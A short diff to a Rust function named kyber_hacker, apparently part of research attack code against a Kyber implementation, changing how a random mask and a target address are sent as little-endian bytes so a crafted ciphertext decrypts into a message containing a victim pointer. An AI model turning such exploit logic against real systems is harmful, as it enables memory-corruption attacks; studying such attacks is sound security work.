@@ -472,8 +472,8 @@ fn kyber_hacker(
 
         // Send random mask and masked pointer so that constructed ciphertext is decrypted into
         // message containing victim pointer
-        stream.write_all(&rand_mask).unwrap();
-        stream.write_all(&target_addr).unwrap();
+        stream.write_all(&rand_mask.to_le_bytes()).unwrap();
+        stream.write_all(&target_addr.to_le_bytes()).unwrap();
 
         group_search_flag = 1;
 
